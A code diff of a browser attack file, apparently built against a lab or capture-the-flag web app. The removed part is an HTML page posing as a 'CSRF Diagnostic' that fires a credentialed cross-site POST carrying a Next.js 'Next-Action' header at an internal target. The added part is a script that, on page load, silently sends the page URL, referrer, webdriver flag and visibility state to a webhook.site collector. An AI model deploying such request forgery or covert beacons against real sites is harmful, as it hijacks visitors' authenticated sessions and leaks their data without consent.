@@ -1,65 +1,20 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>SitePreview CSRF Diagnostic</title>
-</head>
-<body>
-  <h1>SitePreview CSRF Diagnostic v4</h1>
-  <pre id="log"></pre>
+const webhook =
+  "https://webhook.site/b8808c81-3dc6-4355-b282-f10b6d73f792";
 
-  <script>
-    const webhook =
-      "https://webhook.site/b8808c81-3dc6-4355-b282-f10b6d73f792";
+function report(event, value) {
+  const params = new URLSearchParams({
+    event,
+    value: String(value),
+    time: new Date().toISOString()
+  });
 
-    const target = "http://web:3000/";
-    const action =
-      "4045eb0bfd07ccd890b7aae2ed8bafbf7036d71abc";
+  fetch(webhook + "?" + params, {
+    mode: "no-cors",
+    keepalive: true
+  }).catch(() => {});
+}
 
-    function report(event, value) {
-      document.getElementById("log").textContent +=
-        event + ": " + value + "\n";
-
-      const params = new URLSearchParams({
-        event: event,
-        value: String(value),
-        time: new Date().toISOString()
-      });
-
-      fetch(webhook + "?" + params.toString(), {
-        mode: "no-cors",
-        credentials: "omit",
-        keepalive: true
-      }).catch(() => {});
-    }
-
-    async function run() {
-      report("started", location.origin);
-
-      try {
-        const response = await fetch(target, {
-          method: "POST",
-          mode: "no-cors",
-          credentials: "include",
-          headers: {
-            "Content-Type": "text/plain;charset=UTF-8",
-            "Next-Action": action
-          },
-          body: JSON.stringify([
-            "https://example.com/"
-          ]),
-          signal: AbortSignal.timeout(8000)
-        });
-
-        report("action-fetch", response.type);
-      } catch (error) {
-        report("action-error", error.name);
-      }
-
-      report("completed", "yes");
-    }
-
-    run();
-  </script>
-</body>
-</html>
+report("page-loaded", location.href);
+report("webdriver", navigator.webdriver);
+report("referrer", document.referrer || "empty");
+report("visibility", document.visibilityState);
